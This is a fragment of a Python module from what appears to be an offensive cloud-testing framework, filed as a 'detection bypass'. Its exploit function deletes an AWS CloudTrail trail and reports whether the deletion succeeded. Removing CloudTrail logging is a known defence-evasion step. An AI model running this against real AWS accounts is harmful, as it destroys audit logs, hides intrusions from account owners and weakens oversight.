# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-Nebula\teamserver\core\module\detectionbypass\aws_cloudtrail_delete_trail.py
import json
...
def exploit(profile, workspace):
    ...
    try:
        profile.delete_trail(Name=trailName)

        status = f"Successfully deleted CloudTrail Trail {trailName}"

    except Exception as e:
        status = f"CloudTrail Trail {trailName} was not deleted with error code: {str(e)}."
